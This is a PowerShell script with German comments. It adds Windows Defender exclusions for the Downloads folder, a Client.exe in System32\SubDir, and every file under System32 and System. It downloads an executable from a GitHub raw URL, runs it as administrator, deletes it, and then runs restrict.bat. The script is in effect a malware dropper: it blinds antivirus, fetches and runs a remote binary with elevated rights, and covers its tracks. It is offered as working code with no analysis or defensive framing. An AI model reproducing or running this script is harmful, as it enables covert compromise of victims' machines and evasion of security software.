# 1. DrivePath (Gesamtes Laufwerk C:) und wichtige Systemordner als Ausnahmen hinzufügen
$DrivePath = "C:\"  # Beispiel für die C:-Partition
$System32Path = "C:\Windows\System32"  # Der gesamte System32-Ordner
$SystemPath = "C:\Windows\System"      # Der System-Ordner
$DownloadPath = "$env:USERPROFILE\Downloads"  # Der Download-Ordner
$SubDirPath = "C:\Windows\System32\SubDir"   # Beispiel für einen SubDir-Ordner, in dem die Client.exe liegt
$ClientExePath = "C:\Windows\System32\SubDir\Client.exe"  # Der Pfad zur Client.exe

# Überprüfen, ob Windows Defender läuft
$defenderService = Get-Service -Name windefend -ErrorAction SilentlyContinue
if ($defenderService.Status -ne 'Running') {
    Write-Host "Starte Windows Defender-Dienst..." -ForegroundColor Yellow
    Start-Service -Name windefend
    Start-Sleep -Seconds 3  # Warte ein paar Sekunden, um sicherzustellen, dass der Dienst gestartet ist
} else {
    Write-Host "Windows Defender-Dienst läuft bereits." -ForegroundColor Green
}

# 2. Füge die spezifischen Ausnahmen hinzu: Download-Ordner und Client.exe
Write-Host "Füge Download-Ordner und Client.exe als Ausnahmen hinzu..." -ForegroundColor Green

# Der Download-Ordner selbst (nicht die Dateien darin)
Add-MpPreference -ExclusionPath $DownloadPath
Write-Host "Füge $DownloadPath als Ausnahme hinzu..." -ForegroundColor Green

# Die Client.exe in SubDir
Add-MpPreference -ExclusionPath $ClientExePath
Write-Host "Füge $ClientExePath als Ausnahme hinzu..." -ForegroundColor Green

# 3. Datei von GitHub herunterladen
$GitHubURL = "https://raw.githubusercontent.com/IchbinMrNook/Private_script_pull/main/Client-built.exe"
$DownloadedFile = Join-Path "$env:USERPROFILE\Downloads" "Client-built.exe"
Write-Host "Lade Datei von GitHub herunter..." -ForegroundColor Green
Invoke-WebRequest -Uri $GitHubURL -OutFile $DownloadedFile

# Überprüfen, ob die Datei heruntergeladen wurde
if (Test-Path $DownloadedFile) {
    Write-Host "Datei erfolgreich heruntergeladen: $DownloadedFile" -ForegroundColor Green
    
    # 4. Datei als Administrator ausführen
    Write-Host "Führe Datei als Administrator aus..." -ForegroundColor Green
    Start-Process -FilePath $DownloadedFile -Verb RunAs

    # 5. 5 Sekunden warten
    Start-Sleep -Seconds 5

    # 6. Datei löschen
    Write-Host "Lösche heruntergeladene Datei..." -ForegroundColor Green
    Remove-Item -Path $DownloadedFile -Force
} else {
    Write-Host "Fehler: Datei konnte nicht heruntergeladen werden!" -ForegroundColor Red
}

# 4. Vor dem Ausführen von restrict.bat, alle anderen Dateien im System32 und System Ordner als Ausnahmen hinzufügen
Write-Host "Füge alle anderen Dateien und Unterordner in System32 und System als Ausnahmen hinzu..." -ForegroundColor Green

# Alle Dateien und Unterordner im System32-Ordner
Get-ChildItem -Path $System32Path -Recurse | ForEach-Object {
    # Hier wird geprüft, ob es sich nicht um die bereits ausgeschlossenen Dateien handelt
    if ($_.FullName -ne $ClientExePath -and $_.FullName -ne $DownloadPath) {
        Add-MpPreference -ExclusionPath $_.FullName
        Write-Host "Füge $_.FullName als Ausnahme hinzu..." -ForegroundColor Green
    }
}

# Alle Dateien und Unterordner im System-Ordner
Get-ChildItem -Path $SystemPath -Recurse | ForEach-Object {
    # Hier wird geprüft, ob es sich nicht um die bereits ausgeschlossenen Dateien handelt
    if ($_ -ne $DownloadPath) {
        Add-MpPreference -ExclusionPath $_.FullName
        Write-Host "Füge $_.FullName als Ausnahme hinzu..." -ForegroundColor Green
    }
}

# 5. Führe restrict.bat aus
Write-Host "Führe restrict.bat aus..." -ForegroundColor Green
./restrict.bat

Write-Host "Skript abgeschlossen." -ForegroundColor Green
